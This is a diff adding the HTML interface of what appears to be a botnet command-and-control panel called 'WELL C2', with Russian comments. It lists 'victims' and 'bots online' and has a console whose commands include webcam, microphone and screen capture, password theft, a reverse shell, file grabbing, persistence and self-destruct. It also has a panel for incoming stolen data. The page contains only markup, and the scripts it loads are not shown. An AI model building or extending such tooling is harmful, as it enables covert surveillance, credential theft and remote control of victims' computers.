@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WELL C2 - Command & Control</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="matrix-bg"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <span class="glitch" data-text="WELL C2">WELL C2</span>
+                <div class="version">v3.14 ─ ACTIVE</div>
+            </div>
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-label">BOTS ONLINE</div>
+                    <div class="stat-value" id="onlineCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">TOTAL VICTIMS</div>
+                    <div class="stat-value" id="totalCount">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">LAST SEEN</div>
+                    <div class="stat-value" id="lastSeen">--:--:--</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="main-grid">
+            <!-- Список жертв -->
+            <div class="panel victims-panel">
+                <div class="panel-title">
+                    <span>🎯 VICTIMS</span>
+                    <button class="refresh-btn" onclick="refreshVictims()">⟳</button>
+                </div>
+                <div class="victims-list" id="victimsList">
+                    <div class="loading">Loading victims...</div>
+                </div>
+            </div>
+            
+            <!-- Консоль управления -->
+            <div class="panel console-panel">
+                <div class="panel-title">💀 COMMAND CONSOLE</div>
+                <div class="selected-bot" id="selectedBot">
+                    No bot selected
+                </div>
+                <div class="command-input-group">
+                    <select id="commandSelect" class="command-select">
+                        <option value="screenshot">📸 Capture Screen</option>
+                        <option value="webcam">🎥 Capture Webcam</option>
+                        <option value="mic">🎙️ Record Microphone</option>
+                        <option value="passwords">🔑 Steal Passwords</option>
+                        <option value="unlock">🔓 Unlock PC</option>
+                        <option value="shell">💻 Reverse Shell</option>
+                        <option value="grab">📁 Grab Files</option>
+                        <option value="persist">🔄 Make Persistent</option>
+                        <option value="destroy">💣 Self Destruct</option>
+                    </select>
+                    <input type="text" id="customCommand" placeholder="Custom command...">
+                    <button class="send-btn" onclick="sendCommand()">▶ EXECUTE</button>
+                </div>
+                <div class="output-area" id="outputArea">
+                    <div class="output-line">> WELL C2 System initialized</div>
+                    <div class="output-line">> Waiting for commands...</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Результаты от ботов -->
+        <div class="panel results-panel">
+            <div class="panel-title">📡 INCOMING DATA</div>
+            <div class="results-list" id="resultsList">
+                <div class="result-line">No incoming data</div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="config.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
